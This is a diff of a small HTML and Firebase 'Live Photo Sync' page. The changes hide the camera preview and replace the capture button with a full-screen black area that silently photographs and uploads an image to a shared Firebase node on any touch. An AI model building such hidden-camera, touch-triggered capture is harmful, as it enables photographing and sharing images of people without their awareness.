@@ -2,40 +2,42 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync</title>
+  <title>Live Photo Sync - Touch Only</title>
   <style>
     body {
       background: black;
       margin: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      color: white;
+      padding: 0;
+      height: 100vh;
+      overflow-y: scroll;
       font-family: sans-serif;
     }
-    video, img {
-      max-width: 100%;
-      height: auto;
-      margin-top: 10px;
+    #captureArea {
+      height: 100vh;
+      width: 100vw;
     }
-    button {
-      padding: 10px;
-      margin-top: 15px;
-      background: #00ffcc;
-      color: black;
-      border: none;
-      font-size: 16px;
-      cursor: pointer;
-      border-radius: 5px;
+    #result {
+      text-align: center;
+      padding: 20px;
+      color: white;
+    }
+    #livePhoto {
+      width: 90%;
+      max-width: 400px;
+      margin-top: 20px;
+      border: 2px solid white;
     }
   </style>
 </head>
 <body>
-  <h2>Live Photo Sync</h2>
-  <video id="video" autoplay playsinline></video>
-  <button onclick="capture()">Capture & Send</button>
-  <img id="livePhoto" src="" />
+  <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>
 
+  <div id="result">
+    <h3>Captured Photo:</h3>
+    <img id="livePhoto" src="" alt="Waiting for photo..." />
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
@@ -59,12 +61,12 @@
     const canvas = document.getElementById('canvas');
     const img = document.getElementById('livePhoto');
 
-    // Show camera on iPhone
+    // Start camera
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
     });
 
-    // Capture photo and upload to Firebase
+    // Capture on any touch
     function capture() {
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
@@ -72,13 +74,17 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg");
 
+      // Upload to Firebase
       db.ref("livephoto").set({
         image: dataUrl,
         time: Date.now()
       });
+
+      // Smooth scroll to result
+      document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
     }
 
-    // Real-time update on Android or other phone
+    // Listen and display live image
     db.ref("livephoto").on("value", snapshot => {
       const data = snapshot.val();
       if (data && data.image) {
